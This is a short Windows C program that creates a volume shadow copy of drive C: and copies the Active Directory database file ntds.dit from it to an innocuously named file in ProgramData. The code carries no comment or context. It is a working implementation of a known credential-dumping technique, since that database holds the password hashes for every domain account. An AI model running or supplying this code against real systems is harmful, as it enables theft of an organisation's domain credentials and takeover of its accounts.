#include <windows.h>
#include <stdlib.h>

int main(void) {
    if (system("vssadmin.exe create shadow /for=C:") != 0) return 1;
    return CopyFileA("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy12\\Windows\\NTDS\\ntds.dit",
                     "C:\\ProgramData\\directory.dat", TRUE) ? 0 : 1;
}
